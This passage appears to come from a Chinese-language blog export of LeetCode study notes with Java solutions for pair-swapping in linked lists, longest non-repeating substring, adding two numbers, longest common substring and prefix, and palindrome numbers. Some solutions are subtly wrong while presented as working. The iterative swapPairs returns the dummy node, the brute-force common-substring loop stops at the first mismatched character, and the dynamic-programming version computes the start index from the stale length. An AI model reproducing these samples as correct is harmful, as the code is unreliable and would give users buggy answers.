<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">	ListNode node = <span class="keyword">new</span> ListNode(<span class="number">9527</span>);</span><br><span class="line">	node.next = head;</span><br><span class="line">	ListNode temp = node;</span><br><span class="line">	<span class="keyword">while</span>(temp.next!=<span class="keyword">null</span> &amp;&amp; temp.next.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">		ListNode first = temp.next;</span><br><span class="line">		ListNode second = temp.next.next;</span><br><span class="line">		first.next = second.next;</span><br><span class="line">		second.next = first;</span><br><span class="line">		temp.next = second;</span><br><span class="line">		temp = first;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> val;</span><br><span class="line">     ListNode next;</span><br><span class="line">     ListNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="递归解决"><a href="#递归解决" class="headerlink" title="递归解决"></a>递归解决</h2><p><img src="http://i.imgur.com/O2rttX2.png" alt></p>
<blockquote>
<p>利用递归的思路解决，把一次操作封装成函数，借助递归实现。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//recursion: the recursive stack uses O(n) space</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">swapPairs</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>)</span><br><span class="line">		<span class="keyword">return</span> head;</span><br><span class="line">	ListNode node = head.next;</span><br><span class="line">	head.next = swapPairs(node.next);</span><br><span class="line">	node.next = head;</span><br><span class="line">	<span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> val;</span><br><span class="line">     ListNode next;</span><br><span class="line">     ListNode(<span class="keyword">int</span> x) &#123; val = x; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>LinkedList(链表)</tag>
      </tags>
  </entry>
  <entry>
    <title>3. Longest Substring Without Repeating Characters</title>
    <url>/2017/02/10/3-Longest-Substring-Without-Repeating-Characters/</url>
    <content><![CDATA[<p>Given a string, find the length of the longest substring without repeating characters.</p>
<p><strong>Examples:</strong></p>
<p>Given <font><code>&quot;abcabcbb&quot;</code></font>, the answer is <font><code>&quot;abc&quot;</code></font>, which the length is 3.</p>
<p>Given <font><code>&quot;bbbbb&quot;</code></font>, the answer is <font><code>&quot;b&quot;</code></font>, with the length of 1.</p>
<p>Given <font><code>&quot;pwwkew&quot;</code></font>, the answer is <font><code>&quot;wke&quot;</code></font>, with the length of 3. Note that the answer must be a substring, <font><code>&quot;pwke&quot;</code></font> is a <em>subsequence</em> and not a <strong>substring</strong>.</p>
<style type="text/css">
font{
color:rgb(199,37,78)
}
</style>

<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><blockquote>
<p>求最长不重复序列。</p>
</blockquote>
<h2 id="循环比对"><a href="#循环比对" class="headerlink" title="循环比对"></a>循环比对</h2><blockquote>
<p>对于所有可能的情况进行比较，找到最长的不重复子序列并保存长度。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(s.length()==<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>,i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;s.length())&#123;</span><br><span class="line">		<span class="keyword">int</span> j = i+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(j&lt;s.length())&#123;</span><br><span class="line">			<span class="keyword">if</span>(s.substring(i,j).contains(String.valueOf(s.charAt(j))))</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			j++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>((j-i)&gt;len)</span><br><span class="line">			len = j-i;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>s.substring(i,j).contains(String.valueOf(s.charAt(j)))</code>这个判断完成了核心的逻辑判断。</p>
<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p><strong>分析</strong></p>
<p>这个方法我觉得并没有多少优势，使用下面HashSet方法表述的方法更清晰。</p>
<blockquote>
<p>The basic idea is, keep a hashmap which stores the characters in string as keys and their positions as values, and keep two pointers which define the max substring. move the right pointer to scan through the string , and meanwhile update the hashmap. If the character is already in the hashmap, then move the left pointer to the right of the same character last found. Note that the two pointers can only move forward.</p>
<p>使用Map来存储，<code>字符-索引</code>；<br><br>两个索引：低索引和高索引，默认值为0<br><br>当高索引遍历到重复字符时，低索引将移动到重复字符第一次出现的位置+1（但是有一定很重要，低索引只能增不能减），那么现在高索引处的字符在<code>低索引---高索引</code>组成的子字符串是唯一的。<br><br>每次在比较并存储在最长的子序列。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestSubstringWithoutRepeatingCharacters</span></span>&#123;</span><br><span class="line">	<span class="comment">//HashMap   This method is very obscure!</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(s.length()==<span class="number">0</span>)</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">int</span> max = <span class="number">0</span>;</span><br><span class="line">    	Map&lt;Character,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">    		<span class="keyword">if</span>(map.containsKey(s.charAt(i)))&#123;</span><br><span class="line">    			<span class="comment">//Note that the two pointers can only move forward.</span></span><br><span class="line">    			j = Math.max(j,map.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">    			<span class="comment">// j = map.get(s.charAt(i))+1;</span></span><br><span class="line">    			System.out.println(<span class="string">"j="</span>+j);</span><br><span class="line">    		&#125;</span><br><span class="line">    		map.put(s.charAt(i),i);</span><br><span class="line">    		max = Math.max(max,i-j+<span class="number">1</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分析：</strong></p>
<p><img src="http://i.imgur.com/aZO47aN.png" alt></p>
<h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p><strong>快慢指针法</strong></p>
<blockquote>
<p>使用快慢指针来解决这个问题，快指针用来添加不存在的字符；而当存在重复字符时，慢指针的作用是用来从字符串的头部删除字符，直到重复的字符被删除为止。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestSubstringWithoutRepeatingCharacters</span></span>&#123;</span><br><span class="line">	<span class="comment">//HashSet</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">if</span>(s.length()==<span class="number">0</span>)</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    	Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">    	<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>,max = <span class="number">0</span>;</span><br><span class="line">    	<span class="keyword">while</span>(j&lt;s.length())&#123;</span><br><span class="line">    		<span class="keyword">if</span>(!set.contains(s.charAt(j)))&#123;</span><br><span class="line">    			set.add(s.charAt(j++));</span><br><span class="line">    			max = Math.max(max,set.size());</span><br><span class="line">    		&#125;<span class="keyword">else</span></span><br><span class="line">    			set.remove(s.charAt(i++));</span><br><span class="line">    	&#125;</span><br><span class="line">    	<span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>分析：</strong></p>
<blockquote>
<p>利用了快慢指针来解决这个问题，没有重复元素时，快指针用来添加不存在字符；反之，慢指针用来删除头字符。<br><br>这样做的好处是利用快慢指针可以快速的得到所有可能的不重复子串。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>最简单易懂的方法是使用循环遍历出所有可能的结果，并筛选出最长的子字符串。时间复杂度达到了O(N2)<br><br>使用HashMap或者HashSet简化时间复杂度到O(N)。</p>
</blockquote>
]]></content>
      <tags>
        <tag>Optimize(优化)</tag>
        <tag>快慢指针</tag>
        <tag>LeetCode-medium</tag>
      </tags>
  </entry>
  <entry>
    <title>2. Add Two Numbers</title>
    <url>/2017/02/08/2-Add-Two-Numbers/</url>
    <content><![CDATA[<p>You are given two linked lists representing two non-negative numbers. The digits are stored in reverse order and each of their nodes contain a <code>single digit</code>. Add the two numbers and return it as a linked list.</p>
<p><strong>Input</strong>: (2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br><br><strong>Output</strong>: 7 -&gt; 0 -&gt; 8</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
<ol>
<li><p>每一个节点上都包含一个单个的数字，那么也就是说进位值最多为1；</p>
</li>
<li><p>结尾处如果存在进位，则应该新建节点。</p>
</li>
</ol>
</blockquote>
<p><strong>版本一</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add2Numbers</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode digit_1 = l1;</span><br><span class="line">        ListNode digit_2 = l2;</span><br><span class="line">        ListNode p = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode sum = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        p.next = sum;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(digit_1 != <span class="keyword">null</span> || digit_2 != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> addUp = (digit_1 != <span class="keyword">null</span> ? digit_1.val : <span class="number">0</span>) + (digit_2 != <span class="keyword">null</span> ? digit_2.val : <span class="number">0</span>) + carry;</span><br><span class="line">            sum.next = (carry = addUp / <span class="number">10</span>) == <span class="number">0</span> ? <span class="keyword">new</span> ListNode(addUp) : <span class="keyword">new</span> ListNode(addUp % <span class="number">10</span>);</span><br><span class="line">            <span class="keyword">if</span>(digit_1 != <span class="keyword">null</span>)</span><br><span class="line">                digit_1 = digit_1.next;</span><br><span class="line">            <span class="keyword">if</span>(digit_2 != <span class="keyword">null</span>)</span><br><span class="line">                digit_2 = digit_2.next;</span><br><span class="line">            sum = sum.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            sum.next = <span class="keyword">new</span> ListNode(carry);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> p.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Add2Numbers</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode c1 = l1;</span><br><span class="line">        ListNode c2 = l2;</span><br><span class="line">        ListNode d = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode result = d;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(c1!=<span class="keyword">null</span> || c2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">//we need sum/10  </span></span><br><span class="line">            sum /= <span class="number">10</span>;</span><br><span class="line">            <span class="keyword">if</span>(c1!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                sum += c1.val;</span><br><span class="line">                c1 = c1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(c2!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                sum += c2.val;</span><br><span class="line">                c2 = c2.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//① very clever!</span></span><br><span class="line">            d.next = <span class="keyword">new</span> ListNode(sum%<span class="number">10</span>);</span><br><span class="line">            d = d.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//②if we have carry</span></span><br><span class="line">        <span class="keyword">if</span>(sum/<span class="number">10</span>==<span class="number">1</span>)</span><br><span class="line">            d.next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> result.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListNode</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ListNode</span><span class="params">(<span class="keyword">int</span> val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">    ListNode next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>① 处直接取模，不需要判断，因为你需要个位上的数字，那么无论数字大于还是小于10都可以取模得到个位上的数字。</p>
<p>② 处是对结尾处进位进行判断，由于每一位最大为9，所以结尾处只需判断是否需要进位，需要进位1即可。</p>
</blockquote>
<h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><blockquote>
<p>这道题主要考察了进位运算在链表的使用情况，难点在代码优化。如何写出简洁、高效的算法是目标。而不能局限于问题的解决！</p>
</blockquote>
]]></content>
      <tags>
        <tag>Optimize(优化)</tag>
        <tag>LeetCode-medium</tag>
        <tag>位运算</tag>
        <tag>LinkedList(链表)</tag>
      </tags>
  </entry>
  <entry>
    <title>Longest Common Substring</title>
    <url>/2017/01/22/Longest-Common-Substring/</url>
    <content><![CDATA[<p>Write a function to find the longest common substring amongst two strings.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="循环查找"><a href="#循环查找" class="headerlink" title="循环查找"></a>循环查找</h2><blockquote>
<p>思路：</p>
<ol>
<li>双循环嵌套，对两个字符串每一个字符进行对比；</li>
<li>如果相同，则应该继续比较，找到当前索引开始的最长相同字符串长度；</li>
<li>每次找到的相同字符串并不一定是最长的，所以需要再做一次比较，保存最长的子串的索引。</li>
</ol>
</blockquote>
<p>时间复杂度：O(n2)<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestCommonSubstring</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">longestCommonSubstring</span><span class="params">(String str1,String str2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len1 = str1.length();</span><br><span class="line">		<span class="keyword">int</span> len2 = str2.length();</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>, len = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len1;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;len2;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(str1.charAt(i)!=str2.charAt(j))</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				<span class="keyword">int</span> start1 = i+<span class="number">1</span>,start2 = j+<span class="number">1</span>,length = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">while</span>(start1&lt;len1 &amp;&amp; start2&lt;len2)&#123;</span><br><span class="line">					<span class="keyword">if</span>(str1.charAt(start1)==str2.charAt(start2))&#123;</span><br><span class="line">						start1++;</span><br><span class="line">						start2++;</span><br><span class="line">						length++;</span><br><span class="line">					&#125;<span class="keyword">else</span></span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(length&gt;len)&#123;</span><br><span class="line">					start = start1-length;</span><br><span class="line">					len = length;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str1.substring(start,start+len);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="DP问题"><a href="#DP问题" class="headerlink" title="DP问题"></a>DP问题</h1><blockquote>
<p>转换成DP问题，当前字串满足最长子串的前提是字串(n-1)满足最长子串&amp;&amp;当前字符相等。<br><br>  动态转移方程为：</p>
</blockquote>
<pre><code>如果xi == yj， 则 c[i][j] = c[i-1][j-1]+1

如果xi ! = yj,  那么c[i][j] = 0
</code></pre><p>时间复杂度：O(n2)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LongestCommonSubstring3</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String []args)</span></span>&#123;</span><br><span class="line">		System.out.println(</span><br><span class="line">			longestCommonSubstring(<span class="string">""</span>,<span class="string">"saabcs"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">longestCommonSubstring</span><span class="params">(String str1,String str2)</span></span>&#123;</span><br><span class="line">		<span class="keyword">int</span> len1 = str1.length()+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> len2 = str2.length()+<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> r[][] = <span class="keyword">new</span> <span class="keyword">int</span>[len1][len2];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> m=<span class="number">0</span>;m&lt;len1;m++)</span><br><span class="line">			r[m][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> n=<span class="number">0</span>;n&lt;len2;n++)</span><br><span class="line">			r[<span class="number">0</span>][n] = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">int</span> start = <span class="number">0</span>,length = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;len1;i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;len2;j++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(str1.charAt(i-<span class="number">1</span>)==(str2.charAt(j-<span class="number">1</span>)))</span><br><span class="line">					r[i][j] = r[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span>(r[i][j] &gt; length)&#123;</span><br><span class="line">					start = i-length-<span class="number">1</span>;</span><br><span class="line">					length = r[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> str1.substring(start,start+length);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>练习下动态规划的思路！</p>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
        <tag>DP(动态规划)</tag>
      </tags>
  </entry>
  <entry>
    <title>14. Longest Common Prefix</title>
    <url>/2017/01/19/14-Longest-Common-Prefix/</url>
    <content><![CDATA[<p>Write a function to find the longest common prefix string amongst an array of strings.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Brute-Forced"><a href="#Brute-Forced" class="headerlink" title="Brute Forced"></a>Brute Forced</h2><blockquote>
<p>我的思路是做加法，每遍历一次字符串数组，就把最长前缀索引+1，直到某一个字符串不存在最长前缀为止。<br><br>这个太费时了，不做这种笨方法。<br><br>需要一个最长前缀索引，然后再遍历所有字符串，如果所有都存在相同的子字符串，则最长前缀索引+1，直到有字符串不包含这个最长前缀字符串，则返回。<br><br>那这个时间复杂度最坏情况下O(n*str.length)</p>
</blockquote>
<h2 id="Optimized（优化）"><a href="#Optimized（优化）" class="headerlink" title="Optimized（优化）"></a>Optimized（优化）</h2><blockquote>
<p>讲真的，我还真没什么想法，看了解答，恍然大悟。<br>最好的思路是做减法：<br></p>
<ol>
<li>假设第一个字符串就是最长前缀，那么遍历字符串数组；</li>
<li>如果，后续的字符串长度小于最长前缀，那么这个最长前缀应该减1；</li>
<li>如果，字符串存在最小前缀，则应该继续检查字符串数组。这里有个很大的优势，如果，后续的字符串不符合最长前缀了，那么，不会影响到前面的判断，因为做的是减法（也就是b∈c的问题，最长前缀总是满足最短的原则）。</li>
<li>那么，如果不存在，则只需要对最长前缀字符串做减法即可。<br></li>
<li>已经得到最长前缀索引，返回即可。</li>
</ol>
<p>这个题很巧妙的利用了减法的思想。<br><br>如果正着查找，那么需要知道每一个字串是否都存在于每一个字符串，如果存在，则在向后加一个字符，在比较。如果用这种减法的思路：先假设一个最长的前缀，如果不存在，应该减小这个最长前缀；如果存在，则应该对后面的字符串继续判断。好处很直观：</p>
<ol>
<li>只需要遍历一次字符串数组；</li>
<li>时间复杂度O(n+strs[0].length)。</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs.length == <span class="number">0</span> || strs[<span class="number">0</span>].length()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        String  pre = strs[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">int</span> hi = pre.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&lt;strs.length &amp;&amp; hi&gt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(strs[i].length()&lt;hi)</span><br><span class="line">                hi--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(strs[i].substring(<span class="number">0</span>,hi).equals(pre.substring(<span class="number">0</span>,hi)))</span><br><span class="line">                i++;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                hi--;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(hi);</span><br><span class="line">        <span class="keyword">return</span> pre.substring(<span class="number">0</span>,hi);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>利用indexOf方法</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">longestCommonPrefix</span><span class="params">(String[] strs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strs.length == <span class="number">0</span> || strs[<span class="number">0</span>].length()==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        String  pre = strs[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;strs.length;i++)</span><br><span class="line">            <span class="keyword">while</span>(strs[i].indexOf(pre.substring(<span class="number">0</span>,pre.length()))!=<span class="number">0</span>)</span><br><span class="line">                pre = pre.substring(<span class="number">0</span>,pre.length()-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><ol>
<li>字符串数组为0或者第一个字符串为0，应该返回空字符串。</li>
<li>最长前缀为空或者遍历完字符串数组时结束。</li>
</ol>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>利用了减法的思想来解决最长前缀问题。</p>
</blockquote>
<p>P.S.</p>
<h1 id="Longest-Common-Substring"><a href="#Longest-Common-Substring" class="headerlink" title="Longest Common Substring"></a><a href="https://war3cdota.github.io/2017/01/22/Longest-Common-Substring/">Longest Common Substring</a></h1>]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Optimize(优化)</tag>
        <tag>减法思维</tag>
      </tags>
  </entry>
  <entry>
    <title>9. Palindrome Number</title>
    <url>/2017/01/10/9-Palindrome-Number/</url>
    <content><![CDATA[<p>Determine whether an integer is a palindrome. Do this without extra space.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="简单的字符串比较"><a href="#简单的字符串比较" class="headerlink" title="简单的字符串比较"></a>简单的字符串比较</h2><blockquote>
<p>借助StringBuffer函数的reverse()方法，可以轻松的对字符串反转，在对翻转后的数字和原数字比较，相等则为回文数。</p>
</blockquote>
<h3 id="出现的问题："><a href="#出现的问题：" class="headerlink" title="出现的问题："></a>出现的问题：</h3><blockquote>
<ol>
<li>数字越界问题，通过stringbuffer转换后，可能出现转化后的数字超越了int的范围。</li>
<li>这样做的时间复杂度和空间复杂度是很浪费的，一个字符是占8位，10位数将占到80位，大于int的32位。</li>
</ol>
</blockquote>
<h2 id="直接操作int"><a href="#直接操作int" class="headerlink" title="直接操作int"></a>直接操作int</h2><blockquote>
<p>使用取模操作直接操作int数字，相等即为回文数。</p>
</blockquote>
<h3 id="Optimized"><a href="#Optimized" class="headerlink" title="Optimized"></a>Optimized</h3><blockquote>
<p>不需要全部转化，只需要转化一半数字即可。但是，由于位数的奇偶性质，可能会出现：</p>
<ol>
<li>左右相等；</li>
<li>左右不相等。</li>
</ol>
</blockquote>
<pre><code>12321转化一般得到12 和 123；
1221 转化则得到12 和 12。
</code></pre><blockquote>
<p><strong>解决办法</strong>：同时检查，（左==右） || （左/10 == 右）。</p>
</blockquote>
<h2 id="Boundary-Check"><a href="#Boundary-Check" class="headerlink" title="Boundary Check"></a>Boundary Check</h2><ol>
<li>负数都不是回文数</li>
<li>0是回文数，但是<code>int%0 == 0</code> 的数不是回文数，但如果采用优化的方案。例如1000，得到的对应的判断是0 和 10，会被误判断为true。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PalindromeNumber</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">		System.out.println(isPalindrome(<span class="number">20</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(x&lt;<span class="number">0</span>||(x!=<span class="number">0</span> &amp;&amp; x%<span class="number">10</span>==<span class="number">0</span>)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(x&gt;result)&#123;</span><br><span class="line">			result*=<span class="number">10</span>;</span><br><span class="line">			result+=(x%<span class="number">10</span>);</span><br><span class="line">			x/=<span 